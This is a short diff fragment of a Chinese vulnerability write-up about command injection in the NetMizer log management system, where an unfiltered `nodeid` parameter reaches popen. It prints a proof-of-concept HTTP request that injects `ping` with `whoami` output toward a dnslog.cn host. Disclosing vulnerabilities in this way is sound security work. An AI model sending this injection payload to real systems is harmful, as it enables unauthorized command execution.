@@ -66,21 +66,13 @@ NetMizer日志[管理系统](#)是一款专为网络流量管理和优化设计�
                 }
 ```
 
-深入探索
-
-网络安全
-
-数据管理
-
-工程与技术
-
 `$nodeid` 未经过过滤或转义就直接插入命令字符串中使用`popen`执行拼接后的命令，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机科学
+工程与技术
 
 ```
 GET /data/search/position.php?action=file&nodeid=1;ping+`whoami`.dnslog.cn+%23+ HTTP/1.1
